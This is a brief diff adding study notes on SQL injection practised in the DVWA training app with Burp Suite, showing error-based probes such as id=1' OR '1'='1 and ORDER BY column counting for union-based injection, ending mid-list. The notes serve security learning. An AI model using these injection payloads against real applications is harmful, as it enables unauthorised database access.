@@ -1,1 +1,10 @@
+A. SQLi (**DVWA & Burp Suite**)
 
+1. Classic SQLi (Error-Based)
+id=1 -> shows 1 record
+id=1' -> error
+id=1' OR '1'='1 -> shows all records
+
+2. Union-Based SQLi
+id=1' ORDER BY 1# , 2# , ... until error occurs (confirms column count)
+id=1' ORDER BY 3# -> error (2 columns here)
